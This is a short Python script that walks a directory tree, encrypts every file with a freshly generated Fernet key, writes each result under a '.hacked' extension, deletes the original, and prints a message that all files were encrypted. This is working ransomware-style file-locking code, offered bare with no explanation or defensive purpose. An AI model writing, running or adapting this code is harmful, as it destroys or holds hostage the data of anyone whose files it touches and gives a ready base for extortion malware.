import os
from cryptography.fernet import Fernet

# Generate a random encryption key
def generate_key():
    return Fernet.generate_key()

# Encrypt a file using the encryption key
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as f:
        file_data = f.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path + ".hacked", "wb") as f:
        f.write(encrypted_data)
    os.remove(file_path)  # Remove original file after encryption

# Generate encryption key
key = generate_key()
print("Encryption Key:", key.decode())

# Encrypt all files in a directory
directory = "/path/to/your/directory"
for root, dirs, files in os.walk(directory):
    for file in files:
        file_path = os.path.join(root, file)
        if not file_path.endswith(".hacked"):
            encrypt_file(file_path, key)

print("All files encrypted and renamed with '.hacked' extension.")
